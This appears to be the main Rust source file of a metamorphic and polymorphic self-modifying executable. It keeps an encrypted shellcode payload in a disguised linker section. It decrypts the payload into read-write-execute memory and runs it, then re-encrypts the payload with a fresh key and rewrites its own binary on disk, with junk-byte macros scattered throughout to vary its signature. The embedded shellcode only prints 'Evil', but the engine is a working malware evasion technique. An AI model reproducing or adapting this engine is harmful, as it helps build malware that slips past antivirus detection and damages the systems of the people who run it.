#![allow(warnings)]
#![feature(asm)]

use std::arch::asm;
use std::env;
use std::thread;
use std::time::Duration;
use std::ptr::{copy, read_volatile};
use std::mem::transmute;

use mmap::{MapOption, MemoryMap};

// modules
mod metamorphic;
mod polymorphic;

// key section
#[link_section = ".nsp0"]
#[used]
static mut KEY: [u8; 32] = [0; 32];

// nonce section
#[link_section = ".nsp1"]
#[used]
static mut NONCE: [u8; 12] = [0; 12];

// First run bool
#[link_section = ".lbss"]
#[used]
static mut FIRST: u8 = 0;

// Payload function section
#[link_section = ".hash"]
#[used]
static FUNC: [u8; polymorphic::CRYPTED_FUNC_SIZE] = *b"\x6a\x01\x58\x50\x5f\xbe\x76\x69\x6c\x0a\x48\xc1\xc6\x08\x48\x83\xf6\x45\x56\x54\x5e\x6a\x05\x5a\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05";

fn main() {
    let args: Vec<String> = env::args().collect(); metamorphic::junk!();
    let filename = &args[0];
    let mut code = Vec::new();

    // Read argv[0] into code variable
    metamorphic::read_binary_file(filename, &mut code).ok(); metamorphic::junk!();

    // Check for ASM locations and randomize junk bytes
    metamorphic::metamorph(&mut code); metamorphic::junk!();

    // Initialize linked sections
    let key = unsafe { read_volatile(&KEY) }; metamorphic::junk!();
    let nonce = unsafe { read_volatile(&NONCE) }; metamorphic::junk!();
    let first = unsafe { read_volatile(&FIRST) }; metamorphic::junk!();
    let func = unsafe { read_volatile(&FUNC) }; metamorphic::junk!();

    // Decrypt payload function section
    let mut decrypted_func = polymorphic::decrypt_func(&mut code, key, nonce, first).ok().unwrap(); metamorphic::junk!();

    // Don't run payload in first run
    if first != 0 {
        thread::spawn(move || {
            unsafe {
                // Create RWX memory region
                let decrypted_func_map = MemoryMap::new(
                    decrypted_func.len(),
                    &[
                        MapOption::MapAddr(0 as *mut u8),
                        MapOption::MapOffset(0),
                        MapOption::MapFd(-1),
                        MapOption::MapReadable,
                        MapOption::MapWritable,
                        MapOption::MapExecutable,
                    ],
                ).unwrap(); metamorphic::junk!();

                // Copy decrypted payload function into memory region
                copy(decrypted_func.as_ptr(), decrypted_func_map.data(), decrypted_func.len()); metamorphic::junk!();
                let decrypted_func_ptr: extern "C" fn() -> ! = transmute(decrypted_func_map.data()); metamorphic::junk!();

                // Run decrypted payload function
                decrypted_func_ptr();
            }
        });
    }

    // Wait for decrypted payload function to finish
    thread::sleep(Duration::from_millis(100));

    // Re-encrypt payload function section with new random key
    polymorphic::encrypt_func(&mut code, &mut decrypted_func).ok(); metamorphic::junk!();

    // Rewrite binary file
    metamorphic::write_binary_file(filename, &mut code).ok();
}
